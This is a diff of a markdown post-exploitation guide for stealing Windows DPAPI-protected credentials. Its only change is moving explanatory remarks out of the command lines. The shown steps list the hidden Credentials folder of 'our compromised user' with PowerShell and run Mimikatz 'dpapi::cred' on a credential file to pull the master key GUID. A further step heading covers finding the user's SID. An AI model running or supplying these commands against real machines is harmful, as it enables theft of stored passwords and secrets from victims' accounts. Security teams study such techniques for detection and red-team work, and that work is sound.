@@ -4,11 +4,15 @@
 
 ## 1) Enumerate the credentials folders of our compromised user:
 
-    Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Credentials\ (If true positive, you should see some numeric values like: 84F1CAEEBF466550F4967858F9353FB4 as an example)
+If true positive, you should see some numeric values like: 84F1CAEEBF466550F4967858F9353FB4 as an example
+
+    Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Credentials\ 
 
 ## 2) Transfer and run Mimikatz to check more details of the credentials we found
 
-    mimikatz# dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX (From all the data we dumped, we need THE GUID MASTERKEY for now)
+From all the data we dumped, we need THE GUID MASTERKEY for now
+
+    mimikatz# dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX 
 
 ## 3) Find the SID number of our compromised user
 
